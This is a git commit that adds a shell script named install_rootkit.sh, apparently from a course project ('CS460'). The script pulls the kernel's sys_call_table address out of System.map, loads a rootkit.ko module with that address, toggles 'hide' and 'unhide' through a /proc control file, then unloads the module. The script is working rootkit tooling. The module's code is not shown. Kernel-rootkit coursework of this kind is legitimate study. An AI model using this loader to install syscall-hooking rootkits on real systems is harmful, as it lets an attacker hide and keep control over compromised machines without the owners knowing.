0d9eca912cdf2b32d18f25528de2b65d3be5622e
root <root@localhost>
2017-04-26 21:48:45 -0700

    add install script

---
+++ install_rootkit.sh
@@ -0,0 +1,15 @@
+#/bin/sh
+
+SYS_CALL_ADDR=$(cat /boot/System.map-$(uname -r)  | grep -w "sys_call_table" | cut -d" " -f1)
+
+#echo $SYS_CALL_ADDR
+
+insmod rootkit.ko sys_call_table_addr_input=${SYS_CALL_ADDR}
+
+echo "hide" > /proc/CS460/status
+
+echo "unhide" > /proc/CS460/status
+
+rmmod rootkit
+
+dmesg
